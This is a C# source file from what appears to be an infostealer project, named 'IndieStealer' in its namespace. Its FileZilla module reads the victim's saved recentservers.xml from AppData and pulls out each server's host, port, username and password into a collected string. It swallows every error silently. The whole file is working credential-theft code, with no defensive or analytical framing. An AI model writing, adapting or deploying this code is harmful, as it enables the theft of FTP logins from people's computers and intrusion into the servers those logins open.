using System;
using System.IO;
using System.Text;
using System.Xml;

namespace IndieStealer.Collect.FTP
{
    class FileZilla
    {
        private static string FileZillaDir = Info.Appdata + "\\FileZilla\\recentservers.xml";

        public static string credentials { get; set; }

        public static void Collect()
        {
            StringBuilder builder = new StringBuilder();
            try
            {
                if (File.Exists(FileZillaDir))
                {
                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.Load(FileZillaDir);
                    foreach (XmlElement xml in ((XmlElement)xmlDoc.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
                    {
                        string[] data = new string[4] { "","","",""};
                        XmlNodeList[] xmlNodeList = new XmlNodeList[] { xml.GetElementsByTagName("Host"), xml.GetElementsByTagName("Port"), xml.GetElementsByTagName("User"), xml.GetElementsByTagName("Pass") };
                        int counter = 0;
                        foreach (var item in xmlNodeList)
                        {
                            if (item.Count > 0)
                                data[counter++] = item[0].InnerText;
                        }
                        if (!string.IsNullOrEmpty(data[0]) && !string.IsNullOrEmpty(data[1]) && !string.IsNullOrEmpty(data[2]))
                        {
                            builder.AppendLine($"Host: {data[0]} ");
                            builder.AppendLine($"Port: {data[1]} ");
                            builder.AppendLine($"User: {data[2]} ");
                            builder.AppendLine($"Password: {data[3]}");
                            builder.AppendLine("________________________\r\n");
                        }
                    }
                    credentials = builder.ToString();
                }
            }
            catch (Exception)
            {}
        }
    }
}
